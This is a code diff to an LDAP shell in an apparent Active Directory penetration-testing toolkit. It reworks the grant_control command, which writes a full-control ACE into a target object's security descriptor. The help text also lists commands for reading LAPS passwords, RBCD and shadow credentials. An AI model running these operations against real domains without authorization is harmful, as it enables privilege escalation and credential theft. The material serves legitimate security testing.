@@ -510,51 +510,52 @@ class LdapShell(cmd.Cmd):
 
     def do_grant_control(self, line):
         args = shlex.split(line)
-
-        if len(args) != 1 and len(args) != 2:
-            raise Exception("Error expecting target and grantee names for RBCD attack. Recieved %d arguments instead." % len(args))
+        if len(args) == 2:
+            target_name, grantee_name = args
+            target_filter = ''
+            target_base = self.domain_dumper.root
+        elif len(args) == 3:
+            target_base, target_filter, grantee_name = args
+            target_name = ''
+        else:
+            raise Exception('Expecting target and grantee name or target search base, target search filter and grantee name. Recieved %d arguments instead.' % len(args))
 
         controls = security_descriptor_control(sdflags=0x04)
 
-        target_name = args[0]
-        grantee_name = args[1]
+        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})', attributes=['objectSid'], controls=controls)
+        if not self.client.entries:
+            raise Exception(f'Could not find user: {self.client.result["description"]}: {self.client.result["message"]}')
+        if len(self.client.entries) > 1:
+            raise Exception('Grantee is not unique')
+        grantee_sid = self.client.entries[0]['objectSid'].value
+        print(f'Resolved {grantee_name!r} to {grantee_sid!r}')
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
-        if success is False or len(self.client.entries) != 1:
-            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
-
-        target = self.client.entries[0]
-        target_sid = target["objectSid"].value
-        print("Found Target DN: %s" % target.entry_dn)
-        print("Target SID: %s\n" % target_sid)
-
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
-        if success is False or len(self.client.entries) != 1:
-            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
-
-        grantee = self.client.entries[0]
-        grantee_sid = grantee["objectSid"].value
-        print("Found Grantee DN: %s" % grantee.entry_dn)
-        print("Grantee SID: %s" % grantee_sid)
+        if target_name and not target_filter:
+            target_filter = f'(sAMAccountName={escape_filter_chars(target_name)})'
+        self.client.search(target_base, target_filter, attributes=['nTSecurityDescriptor'], controls=controls)
+        if not self.client.entries:
+            raise Exception(f'Could not find target: {self.client.result["description"]}: {self.client.result["message"]}')
+        if len(self.client.entries) > 1:
+            raise Exception('Target is not unique')
+        target_entry = self.client.entries[0]
+        print(f'Resolved {target_filter!r} to {target_entry.entry_dn!r}')
 
         try:
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_entry['nTSecurityDescriptor'].raw_values[0])
         except IndexError:
             sd = self.create_empty_sd()
-
         sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
-        self.client.modify(target.entry_dn, {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
 
+        self.client.modify(target_entry.entry_dn, {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
         if self.client.result['result'] == 0:
             print('DACL modified successfully!')
-            print('%s now has control of %s' % (grantee_name, target_name))
+            print(f'{grantee_name!r} now has control of {target_entry.entry_dn!r}')
+        elif self.client.result['result'] == 50:
+            raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+        elif self.client.result['result'] == 19:
+            raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
-            else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+            raise Exception('The server returned an error: %s', self.client.result['message'])
 
     def do_set_rbcd(self, line):
         args = shlex.split(line)
@@ -742,7 +743,7 @@ class LdapShell(cmd.Cmd):
  get_user_groups user - Retrieves all groups this user is a member of.
  get_group_users group - Retrieves all members of a group.
  get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
- grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+ grant_control [search_base] target grantee - Grant full control on a given target object (sAMAccountName or search filter plus search base) to the grantee (sAMAccountName).
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
